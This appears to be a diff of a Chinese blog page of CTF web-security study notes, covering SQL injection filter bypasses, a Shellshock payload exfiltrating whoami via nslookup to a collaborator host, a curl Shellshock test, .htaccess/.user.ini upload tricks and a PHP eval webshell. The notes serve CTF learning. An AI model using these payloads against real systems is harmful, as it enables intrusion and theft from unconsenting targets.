@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6842ed1d58cb8da5c83744fe.png">
 <meta property="article:published_time" content="2025-02-23T12:20:33.000Z">
-<meta property="article:modified_time" content="2025-09-28T02:46:58.111Z">
+<meta property="article:modified_time" content="2025-09-28T03:49:49.801Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
@@ -130,17 +130,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">15</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">83</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -228,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-28 10:46:58" itemprop="dateModified" datetime="2025-09-28T10:46:58+08:00">2025-09-28</time>
+                <time title="修改时间：2025-09-28 11:49:49" itemprop="dateModified" datetime="2025-09-28T11:49:49+08:00">2025-09-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -378,7 +378,7 @@
 <li>常见sql注入过滤</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格过滤 → 用 `/**/`、`%<span class="number">0</span>a`、`%<span class="number">0</span>d` 代替。</span><br><span class="line">引号过滤 → 用 `Hex` 编码或字符串函数（如 `CHAR(<span class="number">97</span>)`）。</span><br><span class="line">关键词过滤  → 尝试大小写、内联注释（`SEL<span class="comment">/*!*/</span>ECT`）、冗余语法（`UNION ALL SELECT`）。</span><br><span class="line">逗号过滤  → 使用 `JOIN` 代替 `UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`。</span><br><span class="line">等号过滤  → 用 `LIKE` 或 `IN` 绕过，例如 `WHERE id LIKE <span class="number">1</span>`。</span><br></pre></td></tr></table></figure></div>
-
+<p><a href="https://guayu-kakeru.github.io/posts/7589.html#sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87">另一篇笔记中的绕过方法</a></p>
 <ul>
 <li>数据库查询长度超出待查询的字符串后会返回特殊字符 NULL 或者 ！等</li>
 <li>mysql中的反引号是为了区分 MYSQL 的保留字与普通字符，所以没有过滤反引号就可以用反引号来绕过 保留字比如user</li>
@@ -409,6 +409,7 @@
 <li>如果选择数据库，回显出来是0说明可能是进制有问题，可以选择用hex转成16进制，但是如果数据库中带有数字或者字母会出现英文，如果都是数字，可能是英文被过滤。可以考虑把16进制转成10进制，然后在显示如 <code>&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg</code></li>
 <li>在mysql中，字符串和数字类型也可以比较，比较之前字符串会转化成0   可以构造payload <code>admin&#39; -0-&#39;</code> 因为原始插入语句可能是<code>SELECT * FROM users WHERE username = &#39;admin&#39;-0-&#39; AND password = &#39;xxx&#39;;</code> 插入之后出现表达式0 - 0 &#x3D; 0 然后数据库中用户名的字段是字符串，和0比较也是0 所以可以实现sql注入</li>
 <li>过滤空格和逗号，要读取数据可以用类似<code>select mid((&#39;123&#39;)from(1)for(2))</code></li>
+<li>无法用information中的表，查不到table的时候，先尝试flag</li>
 </ul>
 <h2 id="ctf中的linux"><a href="#ctf中的linux" class="headerlink" title="ctf中的linux"></a>ctf中的linux</h2><ul>
 <li>nl 命令在 <a target="_blank" rel="noopener" href="http://codex.wordpress.org.cn/Linux">linux</a> 系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。（一般对输入字符有限制的时候用</li>
@@ -417,12 +418,12 @@
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>sess_abc123def456</span><br></pre></td></tr></table></figure></div>
 <ul>
-<li>在单引号字符串中插入单引号的办法<code>&#39;&quot;&#39;&quot;&#39;</code><br>&emsp;原理： <strong>将字符串拆分成多段</strong>，通过交替使用单引号 <code>&#39;</code> 和双引号 <code>&quot;</code>，间接插入单引号字符。其实就是一种拼接的形式  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 错误示例，会导致解析错误 echo <span class="string">&#x27;This is a &#x27;</span>test<span class="string">&#x27; string.&#x27;</span> </span></span><br><span class="line">    <span class="meta"># 正确示例 echo <span class="string">&#x27;This is a &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;test&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27; string.&#x27;</span></span></span><br><span class="line">    <span class="meta">#等效于</span></span><br><span class="line">    <span class="string">&#x27;&lt;?php system (&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;cat fl*&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+<li>在单引号字符串中插入单引号的办法<code>&#39;&quot;&#39;&quot;&#39;</code><br>&emsp;原理： <strong>将字符串拆分成多段</strong>，通过交替使用单引号 <code>&#39;</code> 和双引号 <code>&quot;</code>，间接插入单引号字符。其实就是一种拼接的形式  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 错误示例，会导致解析错误 echo <span class="string">&#x27;This is a &#x27;</span>test<span class="string">&#x27; string.&#x27;</span> </span></span><br><span class="line">    <span class="meta"># 正确示例 echo <span class="string">&#x27;This is a &#x27;</span> <span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;test&#x27;</span> <span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27; string.&#x27;</span></span></span><br><span class="line">    <span class="meta">#等效于</span></span><br><span class="line">    <span class="string">&#x27;&lt;?php system (&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;cat fl*&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
 <li>在linux中命令中间有分隔符，单引号双引号反斜杠反引号也可以照样执行命令比如<code>l&#39;&#39;s l&quot;&quot;s l\s l``s</code></li>
 <li>shellshock漏洞:，Bash <strong>在解析环境变量时存在漏洞</strong>，如果环境变量的值以 <code>()</code> 开头并带有 <strong>额外的命令</strong>，Bash 会<strong>在解析时执行这些命令</strong>，即使它们不在函数体内。</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()&#123; :; &#125;; <span class="regexp">/usr/</span>bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure></div>
-<p>通过 HTTP 请求中的 User-Agent、Referer、Cookie 等 Header 注入恶意环境变量</p>
+<p>检测方法 <code>curl -v ip  -H &quot;Referer:() &#123;  test;&#125;; echo &#39;Content-Type: text/plain&#39;;echo;echo; /usr/bin/id;exit&quot;</code><br>通过 HTTP 请求中的 User-Agent、Referer、Cookie 等 Header 注入恶意环境变量</p>
 <ul>
 <li>linux中的mac地址在<code>/sys/class/net/eth0/address</code>  如果用mac地址作为随机种子，要去掉冒号，然后加上0x变成十六进制，因为随机种子一般是1位</li>
 <li>nginx配置文件在<code>/usr/local/nginx/conf/nginx.conf</code></li>
@@ -452,7 +453,7 @@
 </tbody></table>
 </li>
 <li><code>.htaccess</code> 是一个纯文本文件，它里面存放着 Apache 服务器配置相关的指令。<br> .htaccess 主要的作用有：URL 重写、自定义错误页面、MIME 类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义 404 错误页面、阻止 &#x2F; 允许特定 IP&#x2F;IP 段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br> .htaccess 的用途范围主要针对当前目录。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># jpg文件解析成php文件</span></span><br><span class="line">   <span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div></li>
-<li>在 php 中 <code>&quot;.user.ini&quot;</code> 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件    名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br> auto_prepend_file: 在页面顶部加载文件<br> auto_append_file: 在页面底部加载文件<br> 而且这种方式解析的文件都会被当作php文件执行，在一些文件上传题目也会碰到</li>
+<li>在 php 中 <code>&quot;.user.ini&quot;</code> 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br> auto_prepend_file: 在页面顶部加载文件<br> auto_append_file: 在页面底部加载文件<br> 而且这种方式解析的文件都会被当作php文件执行，在一些文件上传题目也会碰到</li>
 <li>如果环境支持<code>伪协议</code>，用<code>user.ini</code>也可以包含伪协议</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.user</span><span class="selector-class">.ini</span></span><br><span class="line">auto_append_file=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure></div>
@@ -583,44 +584,20 @@
 <li><code>http://sudo.cc</code> 就是指向127.0.0.1</li>
 </ul>
 <h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ul>
-<li><p>得到信息没有flag字样的时候想想是不是base64等编码</p>
-</li>
-<li><p>php伪协议无法使用就用日志注入 蚁剑中的https证书忽略打开  做过一题限制了显示个数 所以不能尝试太多</p>
-</li>
-<li><p>写入的 <code>session</code> 马上又会被删除，使用我们利用 bp 不断的发包</p>
-</li>
-<li><p>url在字符前加<code>~</code>就是取反，可以用于字母绕过,因为取反的之后的字符大部分都是不可见字符</p>
-  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
-<li><p>php中的<code> $str = preg_replace(&#39;/NSSCTF/&#39;,&quot;&quot;,$_GET[&#39;str&#39;]);</code>如果是将敏感词置换为空，就可以用双写置换，这里就是<code>NSSNSSCTFCTF</code></p>
-</li>
-<li><p>只能写三个字符但是比一个很大的数字大可以用<code>科学计数法</code>9e9</p>
-</li>
-<li><p><code>%09</code>的url解码是&#x2F;t（制表符）有时候空格绕过${IFS}也不行的时候用这个</p>
-</li>
-<li><p>一些题目中如果过滤了?或者php。又要上传一句话木马，可以上传<code>script版本</code>的</p>
-  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
-<li><p>都是两个数字一组的加密字符串，不一定是hex，还有可能是<code>tapcode</code>敲击码</p>
-</li>
-<li><p>sql注入中，如果<code>or</code>或者union这种关键字被过滤尝试双写绕过,而且比如or被过滤那information里面含or也会被过滤</p>
-</li>
-<li><p>蚁剑成功连接之后如果无法看到里面的文件，试试<code>虚拟终端</code>中查看</p>
-</li>
-<li><p>如果cat无法查看，尝试<code>tac</code></p>
-</li>
-<li><p><code>mt_srand (seed)</code> 用于 初始化随机数生成器，其中 seed 是随机数种子。影响：如果使用相同的 seed，那么后续调用 mt_rand () 生成的随机数 始终相同。</p>
-</li>
-<li><p>有时<code>页面源代码</code>中有可以访问的源代码文件</p>
-</li>
-<li><p>原始抓包中的数据如果是URL编码，则发送payload也要url编码</p>
-</li>
-<li><p>注意题目python执行的版本不同，有的题目用python2执行的，比如随机种子生成中两个版本的python生成的结果就不一样</p>
-</li>
-<li><p>在一些无回显的题目中，如果要把返回内容写回到文件，注意flask框架的根目录很可能是&#x2F;app 写到静态文件<code>/app/static/xxx</code>中</p>
-</li>
-<li><p>hex分为普通的hex和asciihex  字符串的时候用asciihex ASCII Hex 用于字符串存储和传输，因为它能保证数据是可读的 ASCII 字符，不会引起协议解析问题。 比如一个hex 41拆成字符4和1 然后找到对应的ascii码 就是3431</p>
-</li>
-<li><p>有时候执行env 可能就会出flag</p>
-</li>
+<li>php伪协议无法使用就用日志注入 蚁剑中的https证书忽略打开  做过一题限制了显示个数 所以不能尝试太多</li>
+<li>写入的 <code>session</code> 马上又会被删除，使用我们利用 bp 不断的发包</li>
+<li>url在字符前加<code>~</code>就是取反，可以用于字母绕过,因为取反的之后的字符大部分都是不可见字符  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
+<li>php中的<code> $str = preg_replace(&#39;/NSSCTF/&#39;,&quot;&quot;,$_GET[&#39;str&#39;]);</code>如果是将敏感词置换为空，就可以用双写置换，这里就是<code>NSSNSSCTFCTF</code></li>
+<li>只能写三个字符但是比一个很大的数字大可以用<code>科学计数法</code>9e9</li>
+<li><code>%09</code>的url解码是&#x2F;t（制表符）有时候空格绕过${IFS}也不行的时候用这个</li>
+<li>一些题目中如果过滤了?或者php。又要上传一句话木马，可以上传<code>script版本</code>的  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
+<li>都是两个数字一组的加密字符串，不一定是hex，还有可能是<code>tapcode</code>敲击码</li>
+<li>sql注入中，如果<code>or</code>或者union这种关键字被过滤尝试双写绕过,而且比如or被过滤那information里面含or也会被过滤</li>
+<li><code>mt_srand (seed)</code> 用于 初始化随机数生成器，其中 seed 是随机数种子。影响：如果使用相同的 seed，那么后续调用 mt_rand () 生成的随机数 始终相同。</li>
+<li>原始抓包中的数据如果是URL编码，则发送payload也要url编码</li>
+<li>注意题目python执行的版本不同，有的题目用python2执行的，比如随机种子生成中两个版本的python生成的结果就不一样</li>
+<li>在一些无回显的题目中，如果要把返回内容写回到文件，注意flask框架的根目录很可能是&#x2F;app 写到静态文件<code>/app/static/xxx</code>中</li>
+<li>hex分为普通的hex和asciihex  字符串的时候用asciihex ASCII Hex 用于字符串存储和传输，因为它能保证数据是可读的 ASCII 字符，不会引起协议解析问题。 比如一个hex 41拆成字符4和1 然后找到对应的ascii码 就是3431</li>
 </ul>
 <h2 id="其他语言知识"><a href="#其他语言知识" class="headerlink" title="其他语言知识"></a>其他语言知识</h2><ul>
 <li>在 Python 正则表达式中，”.” 表示匹配除了换行符之外的任意单个字符，”<em>“ 表示匹配前面的字符零次或多次。因此，”.</em>“ 表示匹配任意长度的字符序列，这也被称为贪婪匹配 (greedy matching)。 注意到这个除了换行符以外，所以可以用<code>%a</code>绕过一些正则匹配，前面是换行就匹配不到</li>
@@ -830,20 +807,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">86</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -866,19 +843,19 @@
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/posts/3265.html" title="posts&#x2F;3265.html">Windows工具</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57685.html" title="posts&#x2F;57685.html">tryhackme-AD笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/30538.html" title="posts&#x2F;30538.html">tryhackme-学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/posts/36199.html" title="posts&#x2F;36199.html">vulnhub-Brainpan</a>
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/28301.html" title="posts&#x2F;28301.html">HMV-fuzzz复现</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/59614.html" title="posts&#x2F;59614.html">CISP-PTE综合题做题笔记</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/19448.html" title="posts&#x2F;19448.html">cisp-pte基础题笔记</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/13378.html" title="posts&#x2F;13378.html">cisp-pte客观题笔记</a>
         </li>
     </ul>
   </div>
